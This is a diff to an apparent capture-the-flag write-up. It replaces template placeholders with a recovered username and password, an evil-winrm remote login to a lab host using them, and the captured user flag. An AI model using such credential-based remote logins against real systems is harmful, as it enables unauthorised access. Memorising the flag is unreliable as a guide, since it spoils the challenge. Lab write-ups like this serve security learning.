@@ -1225,24 +1225,17 @@ result: 0 Success
 ```
 
 Credentials recovered: `support:Ironside47pleasure40Watchful`
-### Vulnerability
 
-Description of the vulnerability exploited.
-
-### Exploitation
-
-Step-by-step exploitation with commands.
-
-```shell
-# Commands used
-```
-
----
 ## User Flag
 
-### Lateral Movement (if applicable)
+```
+evil-winrm -i 10.129.50.211 -u support -p Ironside47pleasure40Watchful
+```
 
-Steps to move from initial foothold to user access.
+```
+*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
+89a6b2b28e02a4a1ef1c54d42f73a1b7
+```
 
 ---
 ## Privilege Escalation
